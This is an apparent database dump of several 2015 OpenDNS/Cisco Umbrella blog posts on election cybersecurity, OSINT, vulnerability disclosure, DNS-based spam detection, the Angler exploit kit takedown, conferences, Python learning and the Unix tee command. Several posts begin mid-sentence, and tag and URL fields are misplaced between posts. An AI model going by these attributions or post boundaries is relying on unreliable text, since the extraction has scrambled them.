Research;News;Security 101', 'https://umbrella.cisco.com/blog/2015/10/28/passwords-are-not-enough-yet-two-factor-auth-is-far-from-common/');

With only one year left before America decides, it’s time to take a closer look at what is being said about the state of security.\nAccording to Tripwire CTO Dwayne Melancon, “there is a big difference between a candidate who has a cybersecurity policy and a candidate who has an understanding of cybersecurity.” A survey the company conducted at Blackhat USA revealed that 55 percent of infosec professionals believe that security will be a key issue in the 2016 election. Melancon went on to comment, “it will be important for any candidate to not only articulate their concern for cybersecurity but to also share a concrete plan for how they will incorporate the expertise of respected experts who can help craft practical, effective, and sustainable cybersecurity policies.”\nTo get a sense of the field’s understanding of the security issue, we visited the sites of the top five candidates from the Democrat and Republican parties, as well as independents John McAfee and Jill Stein. After the first Republican debate in August, Wired magazine declared that “no matter where the candidates stood, one thing was clear: cyber security is the new national security.” However, the results of a brief inspection of each candidate’s official campaign website revealed that cyber security has yet to break into the mainstream as a major platform issue.\nOut of 12 major campaign sites, only four referenced the issue of cybersecurity — and one of those four mentioned it in just one sentence. Three candidates addressed security with a dedicated bullet in their campaign issues section, but only one candidate offered a dedicated security platform in the form of an op-ed for foreignpolicy.com.\nMore troubling than the lack of mention, however, was the fact that security was often simply rolled into answers on how to deal with foreign powers like China and Russia — pigeonholing the topic into the foreign policy arena. However, as many infosec pros know, there is much more at stake, including domestic legislation regarding vulnerability disclosure, privacy, and other issues directly related to security, and the industry that has grown up around it.\nMartin O’Malley wrote that “our digital information and networks are critical to our economic might and national security. We should treat them like the precious resources that they are.” Hopefully, with the election rapidly approaching, we’ll see every candidate make concrete strides towards addressing voter concerns and making cooperation between the security industry and government a reality.', 'Blog;People & Culture', 'https://umbrella.cisco.com/blog/2015/10/22/united-states-of-security-a-look-at-2016-prospects/');

OSINT, or open source intelligence, has been both a boon and an Achilles’ heel for intelligence communities for decades. While certain public information may seem harmless, OSINT collected for malicious purposes can prove devastatingly efficient when devising attacks, especially in the hands of an experienced social engineer.\nOSINT refers to the wide range of information collected from publicly available sources: print and broadcast media, academic texts, and more recently, social media, blogs, forums, and more.\nIn the recent past, OSINT has helped every major world power gather intel on adversaries in conflicts from WWII, to the Korean and Vietnam wars, to the Cold War. Sources have evolved from print publications obtained by foreign agents (the US aerospace publication Aviation Week — dubbed “Aviation Leak” for its scoops — was a “perennial favorite,” according to Mercado) to radio, and finally to the Internet, today’s unequivocal fire hose of information.\nThe Internet not only provides its own wealth of information, it also makes obtaining other sources of OSINT easier than ever. “During the Second World War, Dr. Fairbank traveled far and at great expense to gather Japanese publications in China and send them to Washington,” writes Mercado. “Today, anyone, anywhere can order Japanese media with a click of the mouse from amazon.co.jp or other online merchants and receive the orders by express air shipment.”\nBut with great ease comes great vulnerability. Attackers who are aiming to break into your network won’t read a few newspaper articles and call it day. Numerous tools freely available on the Internet can assist anyone interested in gathering OSINT. Infosec Institute has a brief list, which includes specific information-gathering tools and data such as Maltego, and WHOIS data, as well as multidisciplinary tools like socialmention and NewsNow, which are primarily sales and marketing sites. (Another list is available here.)\nSocial engineers in particular are likely to make use of OSINT. Dale Pearson, writing for subliminalhacking.net, comments: “the use of both open source intelligence and acquired information, allows for individuals and groups involved in cyber crime to fuel their knowledge and power influence and manipulate their targets to achieve the required illusion of trust with their target.”\nHe continues, “The information gathered on a target allows the attacker to create a pretty accurate profile of their target, and potentially of that of their families and friends, as well as their interests both publicly and privately. The aim here is to either act as an individual of trust, or create a pre-text that will be considered trustworthy to aid in achieving their goals.”\nAccording to social-engineer.org, “social engineering is a vector used in [more than] 66 percent of all attacks by hackers, hacktivists, and nation states,” and OSINT enables attackers to be more believable to unsuspecting employees.\nHowever, defenders can make use of OSINT as well — to both understand what information is available to attackers, and how to educate employees and users on what information can be safely shared online. CSO Online statistics show that “the average U.S. company spends $15 million a year battling cybercrime.” Managing OSINT related to your business can help reduce the leverage bad actors have when attempting to infiltrate your networks.\nOSINT is, according to Arthur Hulnick, a former CIA officer, “neither glamorous nor adventurous.” However, “open sources are nonetheless the basic building block for secret intelligence.” While not the sexiest intel on the market, OSINT can be highly effective for attackers. What constitutes sensitive information is different for everyone, so make sure your security team regularly communicates with employees about posting information in forums or on social media channels, and monitors all channels for sensitive data.

Or rather, just after it on Friday — after 24 hours of frenetic work, demos, and of course, lunch. There was a lull in the air; people were too tired to get real work done, but didn’t quite feel like heading home for the day. It was at that point that our director of engineering said, “Hey, who wants to see if we can figure out how to play Zork in HipChat?”\nIn case you didn’t grow up during the earliest days of PC gaming, there was a time when Zork was all the rage — or, more accurately, the whole family of Infocom text adventure games. The game describes each location, and you move around and interact with the world using text input…in other words, the perfect kind of game to play in a chat room:\n\nRather than reinvent the wheel, we decided to leverage Hubot to do the actual interfacing with the chat room. For one thing, we already use Hubot in our chat rooms, so that was a time saver right off the bat. Hubot is basically a collection of plugin scripts that listen for expressions in chat rooms and responds, so all we had to do was write a plugin that would listen for game inputs, send it off to a copy of the game, and then return the output as a chat response.\nAs it turned out, the ‘copy of the game’ part was relatively simple. The first decision was to build a web service separate from Hubot we could ship game input off to. That way we’d have the most flexibility with the games, and avoid adding lots of overhead to Hubot itself. With that decision made, a couple of people started assembling a skeleton application with Express.\nThat left us with the question of how to actually run the games. We knew we didn’t want to implement an interpreter for the games from scratch. They’ve been around since the ‘80s, and there’s no shortage of open-source implementations out there. After a few false starts with pure-JavaScript implementations we found, we settled on frotz. It’s a C implementation, but it offers a ‘dumb’ interface that was perfect for us. You pipe in input, it pipes out output. Using Node’s built-in ChildProcess support we had our Express application spawn an instance of this ‘dumb’ version of frotz.\nThe first iteration of our API was the grossest possible piece of prototype code. It started one instance of the game, accepted commands via a POST request, and echoed back whatever the game returned in the response to that POST. That was enough, though, to point our Hubot script at and play a few turns. Of course, it was rough. There was one game, and if people played it in one room, the state would change unexpectedly for people playing in other rooms.\nIn the days that followed, we made a few improvements:\nCleaned up the code quite a bit\nAdded the ability to start multiple game instances at once\nAdded support for choosing which game to load when starting a new game\nAdded support for per-room and private message game sessions to the Hubot connector\nAdded support for rooms where no prefix is required for Hubot to treat text as game input\nPut the lot into CI and brought up the web service on Quadra, our in-house Docker platform.\nAnd that’s where the project stands today. We’ve spent the last few days cleaning up the code’s more egregious embarrassments, and are happy to say that the zmachine api and the Hubot connector are both up on our GitHub account. We’d love for more people to rediscover the fun of old games, and all of us who worked on it are really looking forward to seeing what comes of the projects on GitHub.\nBy the way, while the Infocom games are a little hard to find nowadays, there’s still a surprisingly large community making games in the genre now known as interactive fiction.

It all depends on how vulnerabilities are disclosed and how quickly vendors act to fix the problem. Accordingly, zero day vulnerabilities can be a nightmare for defenders and a dream for attackers.\nOne of the fundamental tensions in the information security industry has been the competing philosophies between vendors and the independent research community when it comes to vulnerability disclosure. Generally, researchers and vendors are driven by a common desire for safer and more secure software. But the ground rules under which collaboration happens still leave much to be desired.\nGoing Full Disclosure\nEven before security researcher Rain Forest Puppy codified the first “full disclosure” policy, the relationship between security researchers and software vendors has been strained by conflicting motivations, legal threats and accusations of disregard for the security of users.\nHistorically, vendors have claimed that vulnerabilities should be disclosed after a patch is already issued (so-called “responsible” disclosure). This way, they can ensure that their customers are fully protected. On the more enlightened end of the spectrum, vendors proactively engage with researchers who report vulnerabilities, giving them credit and working with them to swiftly fix the problem. However, a cursory look at Attrition.org’s long list of lawsuits and takedown notices targeting security researchers shows that many vendors are not so enlightened. As Wired reports, even security vendors who regularly disclose vulnerabilities in other companies’ products have sued researchers in the past, highlighting the complicated nature of disclosure, even within the information security industry. A tone deaf blog post by Oracle CSO Mary Ann Davidson from earlier this year highlighted this complexity, essentially warning security professionals that they could be sued for reviewing Oracle code for security purposes–a common practice among application security engineers. The common complaint by companies bringing these lawsuits is that their customers’ safety is jeopardized or that intellectual property is compromised by research that exposes design flaws.\nThe “full disclosure” movement was born out of both the legal risk faced by researchers working with vendors, the snail’s pace at which many serious software issues were being fixed and (to some extent) the lack of exposure issues received following private (or “responsible) disclosure. Full disclosure occurs when a researcher publicly posts information about a vulnerability to the general research community, a “name and shame” tactic to force a vendor to patch a publicly known flaw. The term is also the inspiration for the infamous Full Disclosure mailing-list, where several notable zero day vulnerabilities have been announced over the years.\nFull disclosure is controversial, because it can essentially lead to a race between vendors and online criminals–the first group has to race to put out a patch, while the latter group is sometimes working to leverage the fresh exploit in attacks out in the wild. Even if vendors get their patch out promptly, many end users still don’t patch their machines on a regular basis. By some accounts, nearly half of attacks leverage vulnerabilities that are two years old or more, meaning that criminals are still profiting by exploiting these known vulnerabilities. In the most extreme circumstances, full disclosure can be the equivalent of dropping a zero day vulnerability on an unsuspecting user base.\nTo complicate things further, there are no universal standards for full disclosure. While most researchers give vendors a time limit to respond privately and collaborate on a fix, others have been burned by vendors in the past, and are less collaborative. As independent security analyst Richard Stennion writes in Forbes, a lack of a standard framework for how to disclose vulnerabilities can lead to controversy when vulnerabilities like Heartbleed, which impacted millions of servers and devices around the world, are revealed. Before Heartbleed was disclosed, information about the bug leaked out through various security mailing lists and informal networks of researchers, leading to a pronounced difference in response between the companies that were “in the know” and those who found out when the bug was publicly revealed.\nCoordination vs. Anti-Collaboration\nWhen one vendor discloses a vulnerability in another’s product, things can get even more tricky. While full disclosure is often used to protect researchers from lawsuits that would prevent disclosing a vulnerability, vendors are typically able to shield their own employees from legal action. Instead, cross-company disclosures are typically coordinated to improve the security of mutual customers. There’s a long history of outside vendors working with Adobe and Microsoft on the coordinated disclosure of vulnerabilities in software that is generally considered ubiquitous enterprise environments. The update to Microsoft’s Coordinated Disclosure Policy published on the company’s blog earlier this year is a manifesto of sorts, calling for a better working relationship between companies on this issue.\nBut “name and shame” can still be a motivation for disclosure when companies act as rivals. As eWeek‘s Sean Michael Kerner reported in January of this year, Google’s regular disclosure of Microsoft zero day flaws–some of which were already patched–has raised some eyebrows about the lack of communication between the two companies. In another instance, FireEye’s announcement that malware targeting routers built by OpenDNS parent company Cisco Systems was marketed in a similar way to zero day vulnerabilities like Heartbleed, but requires administrator access in order to install on targeted systems… essentially requiring that they already be compromised before the malware could be installed. This marketing effort, after Cisco had already warned users about such attacks a month prior, highlights that disclosures between companies can sometimes be more smoke than fire.\nA Way Forward\nEven with the loaded history of vulnerability disclosure between vendors and researchers, there are some recent indications that progress is being made. Starting in 2007, the Pwn to Own contest at CanSecWest has slowly evolved into the infosec community’s own equivalent of a game show, where researchers work to trump each other with zero day vulnerabilities against some of today’s most well-known software. Increased media attention at shows like Black Hat and DEF CON has elevated some security researchers to rockstar-like levels of notoriety. Indeed, researchers like Metasploit creator H.D. Moore (who once hosted a “Month of Browser Bugs” on his personal blog, dropping over a dozen zero days in less than 30 days) now are infosec industry executives themselves.\nAs the industry has gradually moved away from lawsuits to stop disclosures, a variety of efforts have sprung up to foster a more healthy working relationship between vendors and researchers. The increasing prevalence of bug bounties issued by firms large and small and offering incentives for vulnerability reporting is itself a seismic shift in the way companies have begun to change their stance from reactive to proactive. In 2014, bug bounty firm Bugcrowd announced the first open source framework for vulnerability disclosure, developed alongside legal experts from CipherLaw. This framework provides a way for companies to proactively extend legal protection to researchers and to encourage them to engage directly with vendors in coordinated disclosure.\nBut even as the industry moves to accept (and maybe, embrace) vulnerability disclosures as a valuable tool to increase software security, legal protection for researchers may be the next hurdle for the industry to tackle. As reported by Kim Zetter in WIRED, the National Telecommunications and Information Administration (NTIA) recently held its first-ever meeting on the subject vulnerability disclosure. While the meeting itself was a sign of progress, attendees highlighted how laws like the DMCA may ultimately limit the ability of security researchers to do their jobs.', 'Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2015/10/16/full-disclosure-infosec-industry-still-fighting/');

The only lexical content available is the domain name. Domain names are limited by 253 characters and this makes it challenging to make inferences about the validity of content on the webpage. Consequently, one cannot rely solely on the domain name to help detect new mass spam domains. Luckily, one can use other signals present in DNS data to potentially detect possible spam domains. Today’s blog post will be a brief introduction into a set of methods that can be used to identify possible spam domains in your DNS data.\nIn previous blog posts we discussed using DNS traffic patterns to categorize different types of sites. The pattern examined was a spike in traffic. Many classes of spam domains also exhibit spikes in traffic either when people click on links contained in the spam email or when a domain is used as a exploited mail relay. Identifying categories of spam domains was aided by the use of URIBL.\nURIBL is a realtime URI blacklist used by many mail servers to determine if an incoming piece of mail is associated with a URI on the blacklist. Luckily for us queries to URIBL are made via DNS. This allows us to collect information regarding the domains queried by various mail servers during the course of the day. After collecting a couple hundred URIBL queries and parsing these queries for the embedded URIs we have a list of domains potentially associated with spam.\nWe are most interested in signals regarding the query patterns of these domains. Our hypothesis is that a certain group of these domains all have very similar query patterns. One query pattern that we have studied is the spike. Consequently, we check what domains from the URIBL list also appear on our spike list. Interestingly about 65% of domains that appear in our URIBL list also appear in our list of spiked domains. This is a strong indicator that we have a found a useful signal to identify potentially spammy domains.\nSpikes that fall into the spammy category have two special characteristics that distinguish them from other domains that have spiked. First, the height of the spike for these domains occupy the 98 percentile of spike height. They have substantially higher in size than other domains that have experienced a spike. This could be caused by the amount spam emails sent out. Second, they usually include a qtype of 15 which refers to a mail server request.\nHere is an example of how one such spammy spiked domain appears on Investigate:\n\nWhat was interesting was then following up on the IP that hosted this domain. Interestingly it hosted set of similarly patterned domain names that also all happened to spike in a 2-3 hour window.\n\nThis lends further evidence that this domain was potentially involved in a spam run. Unfortunately, these domains either have WhoisGuard protection or do not have any available Whois information to help us to further follow up research. A future challenge for researchers is to determine where these domains lie in the overall spam chain. The majority of these domains no longer resolve or load up blank pages. Identifying the actual content on the page might help us discover their role in the future. DNS data might not contain the content information of webpages but in conjunction with other sources of data it can be used to identify potentially new threats.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/10/15/dns-and-spam/');

SchmooCon. Bsides(insert city name here). InfoSec. SANS. SOURCE. As in any industry, the security field is packed with conferences, training sessions, exclusive summits, and meetups. These gatherings represent fantastic opportunities to learn, share research, and network with peers — from rock stars to interns, SysAdmins to marketing VPs.\nBut not all cons (short for conferences) are created equal.\nAlthough every event has upsides and downsides, there are very clear divides between the corporate atmosphere, big name speaker, and well-suited attendees involved in national scale shows like RSA, and the more informal, community-run regional events like the BSides series. Outside of these well-known cons, new regional events such as DerbyCon, 44Con, CircleCityCon, and more have popped up around the world in the last five years, signaling a need to do events differently.\nNot everyone wants to attend a mega-show, just as some people cannot see the value in going to a smaller conference, or even a meetup. According to OpenDNS researcher Josh Pyorre, it all boils down to personal preferences. “As a security professional who is really passionate about this work, I prefer the smaller to mid-sized conferences because it’s possible to see others speak about their work and even hang out with them at lobbycon afterwards.”\nWhen it comes to deciding which events to attend, three main categories should be considered: cost, content, and community:\nCOST\nOne major challenge with attending shows like Blackhat USA and RSA is the cost. Full conference badges can run a company upwards of $2000 —  if you’re an independent researcher or a small consulting firm cost can quickly become an issue. However, ticket prices to these events not only cover the cost of attending presentations, parties, and the expo hall, it also pays for access: badges can get you into certain areas of the venue or show floor that non-badge holders cannot enter.\nOn the other hand, medium-sized, regional conferences (such as DerbyCon) are much more reasonably priced, with tickets ranging from $100 – $400. Also, due to their locations in cities like Indianapolis, Chicago and even Detroit, these events carry less travel overhead, making them much more attractive to potential attendees who may be on a budget. One major exception to this rule is DEF CON — more explanation below.\nFinally, there are smaller events like BSides, which are often free to attend (although occasionally require pre-registration). These represent the real grassroots segment of the industry, and are a great place to break into the field.\nCONTENT\nThere’s a reason badges at Black Hat and RSA cost so much — they represent the biggest national stages for security, and therefore attract the most high-profile researchers and speakers. Vulnerabilities that impact vehicles, healthcare, and national security have all made their debut during these events, with plenty of press available to cover the disclosures.\nHowever, regional cons don’t exactly disappoint when it comes to content, despite the lower cost of attendance. Agendas are only so big, and many researchers who just missed the cut at the major national shows will also apply to these events. Smaller cons are also a good place to find specific, esoteric presentations that, while important and interesting, don’t quite fit the bill for audiences at RSA or BlackHat.\nThis trend continues at community events, where speakers can cut their teeth in front of a friendly, knowledgeable audience. But even at BSides, speakers must get their presentation past a panel of organizers to make the schedule — guaranteeing an informative event featuring brand new voices in security.\nCOMMUNITY\nPerhaps the most obvious differentiator at each event is the community. At major shows, there are tens of thousands of people from every aspect of a company: sales, marketing, executives, evangelists, and researchers. It can be overwhelming to schedule meetings, as everyone has their own agenda and objectives to accomplish. On the flip side, these shows are large enough to attract security folks from all over the world — meaning you may get to speak with someone you haven’t seen in years, or meet someone with a completely new viewpoint on the industry.\nSmaller conferences may average a few hundred attendees, but they often inspire fanatical followings — for example, at DerbyCon, if you’re attending, speaking, or working, you’re part of the “family”. The regional locations also contribute to this close-knit feeling, as these events provide opportunities to develop relationships with peers close to home. The smaller size of these events makes networking easier — just pull up a chair in the lobby or bar of the con venue, and be open to conversation! BSides represents this idea in the most extreme example, as the entire event is built by the community, for the community.\nThe DEF CON Exception\nDEF CON is a national conference that takes place alongside Black Hat and BSides Las Vegas, making up the third event of “Security Summer Camp”. But it serves as an interesting exception to the general characteristics of other long-running security cons, that have gradually become more reserved and conservative over time. While evolving into a respected national venue for research and breaking news, it has clung tightly to a counter-culture ethos, a hacker spirit of community that you’d be hard-pressed to find in the besuited halls of Black Hat.\nThe cost to attend DEF CON is $230, cash at the door, as it has always been. DEF CON delivers a fantastic event for a nominal fee, complete with all the hacking types hollywood promised: cyberpunk grrls, mohawked dudes, and combat boots aplenty. The conference sessions are quality too: many of the speakers at DEF CON also present at Black Hat. Of course, despite the great value, there is the inherent danger of getting hacked — but that’s what your phone’s airplane mode was made for!\n\nThere are as many events in the security world as there are types of security professionals — and there is, without a doubt, a event (or even several) that will fit your budget, training requirement, or desire to lobbycon.

Why can’t I get this? How is it that everyone else is seemingly figuring this out and I’m sitting here not even knowing what questions to ask? I hit the proverbial wall, so to speak, and instead of doing what you should do, which is bear down and climb over it, I just stared into it wistfully and decided maybe this just wasn’t for me.\n\nFlash forward to about a month or so later when enough time had passed that I had forgotten about “the wall” and decided to try my luck with Code Academy. I figured it would most likely be tougher without a teacher present to throw questions to, but I figured my new found motivation for figuring out this Python puzzle would power me through the slog. Soon, I was back where I started, staring at the wall again. This time getting stuck on a “Pyg Latin Translator.” I quit again. “This is annoying,” I thought. “I don’t care.”\n\nFortunately, I was only speaking out of annoyance. I do care. I care a lot. This can’t be THAT hard, and I’ve made it a personal goal to learn this, I have to figure this out. It wasn’t until I picked up the book Learn Python The Hard Way by Zed Shaw that I started to realize where I was going wrong. “The problem with teaching you programming is that to understand many of my descriptions, you need to know how to do programing already.” Zed then encourages novice programmers not to stop when they come to something they don’t understand, as most of the time it’ll make sense later on down the road. Hey, great, that’s just about the exact opposite of what I’ve been doing. Stopping, trying to figure it out, and then later getting discouraged when I couldn’t figure it out, was smothering my motivation to continue forward. He then goes on to say, while referring to himself learning to play the guitar, that “repetitive practice is natural and is just how to learn something. I know that to get good at anything you have to practice every day, even if I suck that day (which is often) or it’s difficult.” Man, why hadn’t I thought of this? Why hadn’t I been applying this to learning Python? Everything that I am moderately decent at in my life is a direct result from persistent practice. Cooking, baseball, cooking baseballs, golf, creating sentences that end in ‘etc,’ etc. This was an enormous fail on my part. I decided to change up my methods.\n\nI now have 3 different python learning courses going at the same time, all three with different starting points, teaching styles, etc. Code Academy, which is the faster moving, somewhat concise, teacher who sugar coats very little. Learn Python The Hard Way, which is a more light-hearted, repetition based, slower moving method of learning. And CodeCombat, which is essentially a video game designed to get kids into coding. Do I care that it’s for kids? Nay. I still consider myself a kid in a lot of ways. Pull my finger.\n\nAll of them teaching the exact same language, but from different perspectives. If I get tired of doing one exercise, I stop myself and move onto an entirely different course. This is my own way of climbing over “the wall” and, so far, it seems to be working. I’m figuring this out and, as prophesied to me by many, it’s starting to make more sense. There are still hiccups. I still get frustrated. I still can’t really build much more than a tip calculator at this point, but I’m not worried. The more I push myself, the more I’m learning. The more I continue to learn, the more satisfied I feel about putting the effort in. It’s a slow process, but I’m okay with the fact that it’s not supposed to be easy.\n\nAs the old saying goes, Rome wasn’t burnt in a day.\nPull my finger.', 'Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2015/10/09/vinnys-python-and-the-only-fail/');

This can be useful for many things, such as writing to a file while also writing to stdout:\n$whoami | tee /tmp/file\n ubuntu\nThis left us with a file that we can later use:\n$cat /tmp/file\n ubuntu\nTee can also be used to debug a string of piped commands when you don’t want to disrupt the pipe:\ncat console.log | grep \'config\' | tee /tmp/file | sort -n | uniq -c\nNow you can cat/tmp/file and see what was happening between grep and sort.\nAnd Now For a Short Story\nOne day at the OpenDNS office, we notice that our Jenkins CI build server was reporting all builds as success — even though they were actually failing! If you’re new to Tee, it might not be immediately apparent what went wrong:\n./build.sh | tee console.log\nThe problem here is that the pipe to Tee replaces the exit code of the command with that of Tee. Tee always exits 0 — it always successes. So, in order to catch the failure you can use PIPESTATUS in bash:\n./build.sh  | tee console.log; test ${PIPESTATUS[0]} -eq 0\nSince we are calling index[0] of PIPESTATUS, this will give us the the exit code of our build.sh script. Be aware that when using multiple pipes,  you’ll need to check the status of each one to determine which pipe failed.\nFinally, we’re using the command test -eq 0 to compare equality between the PIPESTATUS exit code and zero — if true, then that means our build script exited successfully this time.\nIf there are multiple commands happening and you’re still not getting the exit code you expect, then it might make sense to wrap everything in a bash script and use set -e, which will force the script to exit upon an non-zero exit code. Just remember that set -e has some gotchas, and it’s probably better to use a trap to catch the signal and exit appropriately.', 'Security;Security Engineering', 'https://umbrella.cisco.com/blog/2015/10/06/the-very-short-tale-of-unixs-tee-command/');

It’s a rare event when hackers and malware authors have their operations curtailed, shutdown or even impacted by members of the infosec community… and even more rare when the community can get an inside look at the infrastructure running these campaigns. That’s why today’s announcement — disclosing Talos Research Group’s work to disrupt the operations of an international ransomware campaign and compromise the infrastructure of one of the most effective methods for distributing malicious software around the world — is so significant.\nThe Angler exploit has been linked to several high­-profile ransomware campaigns, including both CryptoWall and TeslaCrypt. Angler is widely recognized as one of the most advanced and exploit kits on the market — making the information Talos disseminated all the more important for analysts and engineers who are working to protect their company systems from attacks.\nGraph of Angler exploit kit network connections, courtesy of OpenDNS Security Labs\nDetailing the takedown in a report on the Cisco Security blog, Talos was able to disrupt the operations of a threat actor responsible for up to 50 percent of the malicious software’s activity from a ransomware campaign that generated more than $30M USD annually. Based on the Angler servers Talos observed, this one actor targeted up to 90,000 victims every day. More than 60 percent of the infections delivered either CryptoWall 3.0 or TeslaCrypt 2.0 ransomware, both variants that have been discussed previously on the OpenDNS Security Labs blog.\nBut beyond simply sinkholing the domains or shutting down the servers, Talos worked with service provider Limestone Networks to obtain live disk images of the Angler servers. This collaboration allowed Talos researchers to observe the attack campaigns in action, providing valuable information not only on how Angler’s handlers hid their operations from security researchers, but how they architected their infrastructure to ensure maximum effectiveness.\nAngler Infrastructure: More than Meets the Eye\nOne of the most interesting new technical findings from Cisco’s in-depth analysis of the Angler servers was the use of proxies to shield the rest of the exploit infrastructure from investigation. According to Talos’s full report, a single health server was seen monitoring 147 proxy servers over the span of a month. As the report’s authors explain, these proxy servers allow the adversaries “to quickly pivot and change while still shielding the exploit server from identification and exposure.”\nOpenDNS CTO Dan Hubbard explained that the practice of using proxy servers is not yet widespread, but it does reflect a trend towards the increased sophistication of so-called “commodity” attack campaigns. “Inevitably, you have to get the data collated somewhere and if that server gets taken away, then that’s the end of it,” he said. “As a result, we’re seeing criminals build up these sophisticated proxy networks so they can scale linearly, much like a CDN or a real web service. Not only can any of these proxies be taken down without affecting service, but it allows them to obfuscate their true infrastructure. While you may think ‘that’s the command-and-control server,’ actually it’s not. It’s just an intermediary between the proxy servers and the real command-and-control or exploit server.”\n“Behind the scenes, the criminals have to prepare for robustness, redundancy and scale…much like the good guys do,” Hubbard adds. “If they don’t, they will be taken down, taken over and be ineffective. The smarter attackers end up building these very robust transient networks where one piece can go down and the rest keeps running.”\nCross-team Collaboration\n“Within 10 days of the Cisco acquisition, we were sharing data with the Talos team,” Hubbard added. “We were exchanging data and research on TeslaCrypt and Angler, which helps paint a picture of the operators’ infrastructure.” He added that OpenDNS Security Labs and Talos experts have collaborated before on other projects, due to their shared research interests.\nThat research, and the data on Angler collected by both OpenDNS and Talos is as broad as it is deep. Starting in June 2013 at BSides Raleigh, OpenDNS Research Labs’ Dhia Mahjoub first described Angler’s use of the “domain shadowing” technique to evade detection by network security products. This behavior was later also described by Talos researchers Nick Biasini and Joel Esler in an in-depth analysis of Angler published in March of this year. Mahjoub further described Angler’s architecture in talks at Virus Bulletin, Black Hat and other conferences during 2014.\nHubbard said that one of the takeaways from this latest takedown is how OpenDNS and Talos researchers can leverage their different, but mutually-reinforcing skills to uncover other ongoing campaigns.\n“OpenDNS has developed very accurate models that can predict where attackers behind Angler are going to move next. For example, we can analyze traffic spikes and how these spikes relate to the Angler infrastructure that attackers own versus other online infrastructure,” said Hubbard. “Because we see all of the DNS traffic, we know there are connections in our graph of data that indicate people who are infected with Angler get CryptoWall and also TeslaCrypt. But Talos actually had a hunting team that was able to go in and pull the infrastructure out. This ability, combined with the great sample data Talos has through Threat Grid and AMP can provide real attribution to attacks.”\nFor more information about Angler, exploit kits and today’s announcement, check out the infographic below.

Although the initial announcement in June caused a surge of interest and a barrage of questions, now that the ink has dried and the dust has settled (somewhat), I can speak more definitively on what has changed…and more importantly, what hasn’t.\nWith any acquisition, there can often be a fear that the acquired company will radically change or cease to exist, leaving its customers high and dry with little notice or recourse. I can confidently say that isn’t the case here — the OpenDNS and Cisco teams are both working double time to make this transition as smooth as possible for everyone: employees, partners, and most importantly, our customers!\nIn fact, this new chapter in the OpenDNS journey brings with it an unprecedented opportunity for us to help further our mission of securing everyone, everywhere on every device by leveraging the power and reach of the world’s largest networking company. This mission becomes even easier when you consider Cisco’s pledge and drive to become the world’s largest security company too. If you haven’t already seen the worldwide ad campaigns, then at least consider the recent article published on CNBC where Chuck Robbins, Cisco’s new CEO, made his intentions quite clear: “We think that security is a tremendous play for us, and we will use all of our leverage for innovation to actually build out that architecture.”\nAlthough we don’t yet know what the final version of that architecture will be, the benefits of the acquisition are already coalescing into production. By the time the acquisition formally closed, we had already announced a new integration with Cisco’s AMP Threat Grid product, which gives customers of both services the ability to extend the protection of malware domains discovered by Threat Grid directly to their Umbrella global block lists (read more about the integration here). David Ulevitch, founder of OpenDNS, and Scott Harrell, Vice President of Product Management, Cisco Security Business Group recently hosted a webcast explaining this integration, as well as the other benefits of the acquisition; watch it here if you’re interested in learning more.\nWhile OpenDNS is evolving our products and organization within Cisco, there is one thing that hasn’t and won’t change: a passion for excellence and our dedication to bringing our customers and partners unparalleled value in security. While our teams continue to work on the integration, you can still expect to receive the same world-class support and security services that you were getting before — from the same experienced and friendly team that you’re accustomed to working with.\nEveryone at OpenDNS is eager to begin our new chapter as part of Cisco, and we will never forget that we’re honored to bring you along with us! Soon, we’ll be offering you the most comprehensive portfolio of integrated security and networking solutions on the planet — and we hope you’ll take advantage of these combined offerings.

In reality, although those external groups can consume a lot of mindshare, one of the largest elements of friction in organizations comes from within (and cannot be handled with a series of clicks). What is this advanced, persistent, insider threat? Often, it’s the relationship between two fundamentally different teams: research and marketing.\nThere are numerous differences that make collaboration between these teams difficult, but the the root of the cause stems from the fact that researchers want to research. Being pulled away from their work for any reason, especially to help with marketing, can be a big ask, and can lead to departmental lines drawn in the sand.\nThis past weekend at DerbyCon V, I had the incredible opportunity to present on how these two groups can work together to produce great content and research. This idea is something I’ve observed during my time at OpenDNS, where we are fortunate to have teams that understand how to partner seamlessly — but that relationship wasn’t formed overnight. Through trial and error, we were able to establish a rapport that allows us to stay in sync.\nThis talk (slides below) focused first on one of those trials: our release of NLPRank (a new data model developed by OpenDNS researcher Jeremiah O’Connor), in march of this year, followed by a few best practices that could help research and marketing teams collaborate cohesively. Below are a few examples of how security professionals can make the most out of a relationship with the marketing side of the business:\nCommunication is key: Nothing is more important than keeping an open line of dialogue between teams. This communication allows your marketing team to know what cool things the research team has to share, when it’s coming down the line, and how best to create a plan of action to promote it.\nProvide context: When writing, researchers often think of their audience as being other researchers. But when a marketing team is trying to share a story, they need to create a narrative and content that appeals to a wider group — adding context about how your research affects the big picture can speed the process along.\nDo not fear the red line: In many cases, content may need to be edited before it can be shared publicly. It’s not personal and it’s not because marketers love oversimplify complex information — it’s because something didn’t fit. So remember not to take it personally.\nCommit: When a story breaks and you’re finally getting coverage, the worst thing that can happen is for a researcher to bail: on interviews, on calls, on providing quotes and context. It strains relationships with reporters, managers, and teams. So if your research makes headlines, make some time to be available when the media and customer interest rolls in.\nBe patient: As a researcher, you won’t always have the luxury of working with a technically proficient marketing team — especially one that knows as much about security as you do. If this knowledge gap is the case, be patient! It may take a few meetings, but a marketer’s ability to clearly and accurately explain your research can make or break any coverage you may get.\nSee the full presentation here:\n\nMarketers Are Friends, Not Food: DerbyCon 2015  from Kara Drapala', 'Blog;Uncategorized', 'https://umbrella.cisco.com/blog/2015/09/30/spy-v-scribe-why-cant-we-be-friends/');

